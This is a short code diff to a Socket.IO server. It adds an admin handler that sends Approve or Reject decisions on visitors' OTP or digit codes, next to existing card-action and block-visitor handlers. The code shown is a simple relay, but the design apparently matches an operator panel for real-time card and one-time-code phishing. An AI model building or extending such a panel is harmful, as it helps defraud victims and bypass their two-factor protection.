@@ -394,6 +394,12 @@ io.on("connection", (socket) => {
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
 
+  // Admin: Code action (Approve, Reject) for OTP/digit codes
+  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
+    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
+    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
+  });
+
   // Admin: Block visitor
   socket.on("admin:block", (visitorSocketId) => {
     const visitor = visitors.get(visitorSocketId);
